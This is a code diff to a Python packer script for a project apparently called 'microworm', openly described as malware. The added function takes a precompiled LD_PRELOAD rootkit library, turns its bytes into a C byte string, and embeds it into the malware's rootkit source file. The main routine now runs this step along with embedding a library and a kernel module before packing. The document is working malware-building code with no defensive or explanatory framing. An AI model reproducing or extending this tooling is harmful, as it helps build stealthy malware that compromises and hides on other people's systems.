@@ -297,6 +297,31 @@ module = "microworm"
 ## PACKER CODE ##
 #################
 
+def pack_preload_library():
+    # compile the LD_PRELOAD rootkit
+    microkit = "ld_preload/microkit.c"
+    microlib = "ld_preload/microkit.so"
+    #bash(f"gcc -fPIC -shared -o {microlib} {microkit} -ldl")   # commented, since it is precompiled for lower glibc version
+
+    # extract the bytes from the rootkit
+    c_bytes = ""
+    microkit_size = 0
+    with open(microlib, "rb") as f:
+        data = f.read()
+        microkit_size = len(data)
+        c_bytes = "".join(["\\x{:02x}".format(b) for b in data])
+    
+    # insert the rootkit to the malware code
+    rootkit_pre_file = f"{dir_src}/main/modules/rootkit_pre_ld.c"
+    rootkit_file = f"{dir_src}/main/modules/rootkit.c"
+    with open(rootkit_pre_file, "r") as rootkit:
+        code_original = rootkit.read()
+        code_original = code_original.replace("<ld_preload_size>", str(microkit_size))
+        code_original = code_original.replace("<ld_preload_data>", c_bytes)
+        with open(rootkit_file, "w") as f:
+            f.write(code_original)
+
+
 ###
 # pack the malicious library
 def pack(module):
@@ -361,6 +386,7 @@ def pack(module):
 if __name__ =="__main__":
     embed_library()
     embed_kernel_module()
+    pack_preload_library()
     packed_file = pack(module)
 
     # DONE :)
